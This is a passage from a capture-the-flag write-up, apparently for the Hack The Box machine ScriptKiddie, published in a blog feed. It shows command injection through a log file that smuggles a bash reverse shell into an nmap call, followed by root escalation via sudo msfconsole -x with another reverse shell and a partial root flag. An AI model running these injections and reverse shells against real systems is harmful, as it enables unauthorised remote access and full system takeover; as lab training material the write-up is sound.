<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span></code></pre></div><p>What that line does is it extracts the IP address from the log.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nv">log</span><span class="o">=</span><span class="s1">&#39;[2021-06-14 00:28:09.560444] 127.0.0.1&#39;</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nv">$log</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span><span class="line"><span class="cl">127.0.0.1
</span></span></code></pre></div><p>From here, I&rsquo;ll just add a semi-colon and a space before putting my reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;
</span></span></code></pre></div><p>It becomes a stacked command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;&#34;</span> <span class="p">|</span> cut -d<span class="s1">&#39; &#39;</span> -f3- <span class="p">|</span> sort -u
</span></span><span class="line"><span class="cl">127.0.0.1<span class="p">;</span> bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;</span><span class="p">;</span>
</span></span></code></pre></div><p>If I map that format to this line:</p>
<pre tabindex="0"><code>sh -c &#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&#34;
</code></pre><p>It turns into this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sh -c <span class="s2">&#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;.nmap 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;; 2&gt;&amp;1 &gt;/dev/null&#34;</span>
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>Since the logs is cleared automatically, I&rsquo;ll use while loop to keep inserting my malicious log to the <code>hackers</code> file and I&rsquo;ll wait on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kid@scriptkiddie:~/logs$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1&#39;;&#34;</span> &gt; hackers<span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>             
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">33110</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">pwn@scriptkiddie:~$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>pwn<span class="o">)</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614115903137.png" alt="image-20210614115903137"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo---msfconsole">Sudo - msfconsole</h4>
<p>User <code>pwn</code> is allowed to run <code>msfconsole</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwn@scriptkiddie:~$ sudo -l
</span></span><span class="line"><span class="cl">sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> pwn on scriptkiddie:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User pwn may run the following commands on scriptkiddie:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</span></span></code></pre></div><p>To exploit this I can just send a reverse shell using  <code>-x</code> options and then I&rsquo;ll wait on my <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pwn@scriptkiddie:~$ sudo msfconsole -q -x <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9005 0&gt;&amp;1&#34;&#39;</span>
</span></span></code></pre></div><p>And I&rsquo;m rooted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «scriptkiddie» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">9005</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9005</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.226<span class="o">]</span> <span class="m">43512</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>868<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">root@scriptkiddie:/home/pwn# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt
</span></span><span class="line"><span class="cl">cut -c-15 /root/root.txt
</span></span><span class="line"><span class="cl">bf7edd4c58e4420
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614121311990.png" alt="image-20210614121311990"  /></div>
</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
